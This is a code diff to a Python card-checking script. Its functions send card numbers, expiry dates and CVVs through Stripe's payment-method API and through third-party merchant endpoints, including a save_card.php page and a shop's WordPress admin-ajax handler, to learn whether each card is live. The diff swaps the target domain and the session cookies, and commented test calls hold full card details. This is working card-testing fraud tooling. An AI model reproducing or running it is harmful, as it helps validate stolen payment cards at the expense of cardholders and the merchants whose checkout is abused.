@@ -46,8 +46,8 @@ def stch(ccx):
     response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 #    print(response.text)
     try:
-        #ide = (response.json()["id"])
-        print(ide)
+        ide = (response.json()["id"])
+        #print(ide)
     except:
         time.sleep(10)
         return (response.json()["error"]["message"])
@@ -138,17 +138,17 @@ def stau(ccx):
         pass
 
     cookies = {
-        '__stripe_mid': '77a1b87a-b4e9-46af-b659-85e9b249bd099a7459',
         '__test': 'bcd924d9a84b55853dc2833f9ac5338a',
-        '__stripe_sid': '0e7e6b1a-cb0b-4e1a-b47a-426d2e95c528d99fd1',
+        '__stripe_mid': 'f47bdda4-03bd-4f7b-83ee-13f0540db213b99b49',
+        '__stripe_sid': 'eda45755-f757-448b-931d-0381a336b660f4c7eb',
     }
     headers = {
         'Accept': '*/*',
         'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
         'Connection': 'keep-alive',
         'Content-Type': 'application/json',
-        'Origin': 'https://botserver.gt.tc',
-        'Referer': 'https://botserver.gt.tc/',
+        'Origin': 'https://domad.kesug.com/',
+        'Referer': 'https://domad.kesug.com/',
         'Sec-Fetch-Dest': 'empty',
         'Sec-Fetch-Mode': 'cors',
         'Sec-Fetch-Site': 'same-origin',
@@ -162,7 +162,7 @@ def stau(ccx):
         'pm': ide,
     }
 
-    response = requests.post('https://botserver.gt.tc/save_card.php', cookies=cookies, headers=headers, json=json_data)
+    response = requests.post('https://domad.kesug.com/save_card.php', cookies=cookies, headers=headers, json=json_data)
 
 #    print(response.text)
     time.sleep(10)
@@ -318,6 +318,7 @@ def stau2(ccx):
 		    '_ajax_nonce': nonce,
 		}
         response = r.post('https://www.beechridgefarm.co.uk/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
+        #print(response.text)
         try:
             return (response.json()['data']['error']['message'])
         except:
@@ -329,5 +330,5 @@ def stau2(ccx):
     except:
         return ide2
 
-#stch('4217834034502354|11|2025|306')
+#stau('6011006942536849|11|25|377')
 ###
